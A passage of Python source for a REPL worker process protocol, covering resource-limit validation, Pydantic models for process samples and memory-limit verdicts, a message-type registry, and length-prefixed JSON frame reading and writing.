                f"memory_soft_limit_bytes ({self.memory_soft_limit_bytes}) "
                "when both are enabled (non-zero)"
            )
        if self.memory_hard_limit_bytes > 0 and self.memory_hard_limit_bytes > self.rlimit_as_bytes:
            raise ValueError(
                f"memory_hard_limit_bytes ({self.memory_hard_limit_bytes}) must be "
                f"<= rlimit_as_bytes ({self.rlimit_as_bytes})"
            )
        if self.interrupt_grace_ms >= self.deadline_ms:
            raise ValueError(
                f"interrupt_grace_ms ({self.interrupt_grace_ms}) must be < " f"deadline_ms ({self.deadline_ms})"
            )
        return self


# ---------------------------------------------------------------------------
# FEAT-521 — host-local observation models.
#
# These are consumed by ProcessObserver/WorkerHandle/WorkerPool only. They
# never cross the control pipe, so they are deliberately NOT registered in
# `_MESSAGE_TYPES` below.
# ---------------------------------------------------------------------------


class ProcessSample(BaseModel):
    """One point-in-time reading of a worker process' vitals.

    Attributes:
        t: ``time.monotonic()`` timestamp of the sample.
        cpu_s: Cumulative user + system CPU seconds at sample time.
        rss: Resident set size, in bytes.
        state: `psutil` process status (``"running"``, ``"sleeping"``, ...).
        wchan: Linux-only kernel wait channel (``/proc/<pid>/wchan``); empty
            elsewhere or when unavailable.
        threads: Live thread count.
    """

    t: float
    cpu_s: float
    rss: int
    state: str
    wchan: str = ""
    threads: int = 0


#: Busy/idle/health verdict derived by `ProcessObserver` from its sample ring.
Verdict = Literal["booting", "settled", "computing", "stalled", "unavailable"]


class MemoryVerdict(BaseModel):
    """Recorded by `ProcessObserver` when a worker crosses the hard RSS limit.

    Attributes:
        cause: Always ``"memory"`` — matches `NamespaceLossError.cause`.
        rss: Measured RSS, in bytes, at the moment of the breach.
        limit: The `memory_hard_limit_bytes` that was crossed.
    """

    cause: Literal["memory"] = "memory"
    rss: int
    limit: int


#: Every concrete message type, keyed by its ``op`` literal — used to parse
#: an incoming frame's JSON payload back into the right Pydantic model.
_MESSAGE_TYPES: dict[str, type[BaseModel]] = {
    "exec": ExecRequest,
    "inject_df": InjectDfRequest,
    "get_var": GetVarRequest,
    "set_var": SetVarRequest,
    "list_ns": ListNsRequest,
    "snapshot": SnapshotRequest,
    "reset": ResetRequest,
    "ping": PingRequest,
    "result": ExecResult,
    "value": ValueResponse,
    "ok": OkResponse,
    "list_ns_result": ListNsResponse,
    "snapshot_result": SnapshotResponse,
    "pong": PongResponse,
    "error": ErrorResponse,
    "ready": ReadyResponse,
}


def _read_exact(stream: BinaryIO, n: int) -> bytes:
    """Read exactly ``n`` bytes from ``stream``.

    Args:
        stream: Binary stream to read from.
        n: Exact number of bytes required.

    Returns:
        The bytes read.

    Raises:
        EOFError: the stream closed before ``n`` bytes were available.
    """
    chunks: list[bytes] = []
    remaining = n
    while remaining > 0:
        chunk = stream.read(remaining)
        if not chunk:
            if chunks:
                raise EOFError("repl_worker protocol: stream closed mid-frame")
            raise EOFError("repl_worker protocol: stream closed")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def write_frame(stream: BinaryIO, message: BaseModel) -> None:
    """Write one length-prefixed protocol message to ``stream``.

    Frame layout: 4-byte big-endian unsigned length, followed by the
    message's JSON payload (the ``op`` field is included, so the reader can
    dispatch without an out-of-band schema).

    Args:
        stream: Binary stream to write to (flushed after writing).
        message: The Pydantic protocol message to send.
    """
    payload = message.model_dump_json().encode("utf-8")
    stream.write(_LENGTH_STRUCT.pack(len(payload)))
    stream.write(payload)
    stream.flush()


def read_frame(stream: BinaryIO) -> BaseModel:
    """Read one length-prefixed protocol message from ``stream``.

    Args:
        stream: Binary stream to read from.

    Returns:
        The parsed Pydantic protocol message.

    Raises:
        EOFError: the stream closed before a full frame was read.
        ValueError: the payload's ``op`` field is not a known message type.
    """
    header = _read_exact(stream, _LENGTH_STRUCT.size)
    (length,) = _LENGTH_STRUCT.unpack(header)
    payload = _read_exact(stream, length)
    raw = json.loads(payload)
    op = raw.get("op")
    model_cls = _MESSAGE_TYPES.get(op)
    if model_cls is None:
        raise ValueError(f"repl_worker protocol: unknown message op {op!r}")
    return model_cls.model_validate(raw)
